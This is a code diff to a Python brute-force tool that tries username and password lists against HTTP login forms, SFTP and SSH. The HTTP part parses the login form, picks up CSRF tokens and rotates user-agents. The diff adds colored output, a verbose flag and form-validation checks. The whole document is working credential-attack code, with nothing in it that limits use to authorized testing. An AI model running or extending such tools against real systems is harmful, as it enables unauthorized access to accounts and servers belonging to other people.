@@ -8,11 +8,15 @@ import time
 import logging
 import paramiko
 import pysftp
+from colorama import Fore, Style, init
+
+# Initialize colorama
+init()
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def http_brute_force(url, usernames, passwords, request_delay):
+def http_brute_force(url, usernames, passwords, request_delay, verbose):
     # User-agent generator
     ua = UserAgent()
 
@@ -26,9 +30,17 @@ def http_brute_force(url, usernames, passwords, request_delay):
     # Find the login form
     form = soup.find("form")
 
+    if not form:
+        logging.error("Login form not found.")
+        return
+
     # Find form field names
     fields = form.find_all("input")
     field_names = [field.get("name") for field in fields if field.get("name")]
+
+    if len(field_names) < 2:
+        logging.error("Not enough form fields found.")
+        return
 
     # Find CSRF token or other hidden fields
     token_name = None
@@ -62,10 +74,11 @@ def http_brute_force(url, usernames, passwords, request_delay):
         try:
             response = requests.post(url, data=data, headers=headers)
             if "Başarısız" not in response.text and "Failed" not in response.text:
-                logging.info(f"Found valid credentials: {username}:{password}")
+                logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
                 return True
             else:
-                logging.info(f"Invalid credentials: {username}:{password}")
+                if verbose:
+                    logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
                 return False
         except requests.RequestException as e:
             logging.error(f"Request error: {e}")
@@ -83,14 +96,15 @@ def http_brute_force(url, usernames, passwords, request_delay):
     thread.start()
     thread.join()
 
-def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5):
+def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5, verbose=False):
     def try_login(username, password):
         try:
             with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
-                logging.info(f"Found valid credentials: {username}:{password}")
+                logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
                 return True
         except Exception as e:
-            logging.info(f"Invalid credentials: {username}:{password} - {e}")
+            if verbose:
+                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password} - {e}{Style.RESET_ALL}")
             return False
 
     for username in usernames:
@@ -100,17 +114,18 @@ def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5):
                 return
             time.sleep(request_delay)
 
-def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5):
+def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbose=False):
     def try_login(username, password):
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(host, port=port, username=username, password=password)
-            logging.info(f"Found valid credentials: {username}:{password}")
+            logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
             ssh.close()
             return True
         except paramiko.AuthenticationException:
-            logging.info(f"Invalid credentials: {username}:{password}")
+            if verbose:
+                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
             return False
         except Exception as e:
             logging.error(f"Connection error: {e}")
@@ -135,6 +150,7 @@ def main():
     parser.add_argument('-H', '--host', required=True, help='Target host')
     parser.add_argument('-d', '--delay', type=int, default=5, help='Request delay in seconds')
     parser.add_argument('--port', type=int, help='Port number')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
 
     args = parser.parse_args()
 
@@ -157,11 +173,11 @@ def main():
         parser.error("At least one username and one password must be provided.")
 
     if args.http:
-        http_brute_force(args.host, usernames, passwords, args.delay)
+        http_brute_force(args.host, usernames, passwords, args.delay, args.verbose)
     elif args.ftp:
-        ftp_brute_force(args.host, usernames, passwords, port=args.port or 21, request_delay=args.delay)
+        ftp_brute_force(args.host, usernames, passwords, port=args.port or 21, request_delay=args.delay, verbose=args.verbose)
     elif args.ssh:
-        ssh_brute_force(args.host, usernames, passwords, port=args.port or 22, request_delay=args.delay)
+        ssh_brute_force(args.host, usernames, passwords, port=args.port or 22, request_delay=args.delay, verbose=args.verbose)
     else:
         parser.print_help()
 
